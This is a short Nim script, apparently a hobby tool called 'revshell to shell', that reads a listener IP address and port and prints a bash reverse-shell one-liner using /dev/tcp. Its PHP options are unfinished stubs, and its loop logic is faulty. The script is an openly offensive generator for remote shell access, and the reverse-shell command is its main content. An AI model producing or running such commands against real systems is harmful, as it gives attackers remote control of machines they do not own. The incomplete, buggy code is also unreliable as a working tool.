# 25/02/17

echo """
    Welcome to revshell to shell 
    v0.1 = beta version
"""

echo "choose bash/interactive.php/php"

var 
    ip_addr: string
    port: string
    opt_on: string = readLine(stdin)
    opt_tw: string
    encode: string
    tipe: string

while true:
    
    case opt_on:
        of "bash":
            echo "hosted ip:"
            ip_addr = readLine(stdin)
            echo "hosted port"
            port = readLine(stdin)
            echo "rev generated: bash -c 'bash -i >& /dev/tcp/"&ip_addr&"/"&port&" 0>&1' "
            break
        of "php":
            echo "Working..."
        of "interactive.php":
            echo "Working..."
        else:
            echo "Not working..."
            break

# 15m coding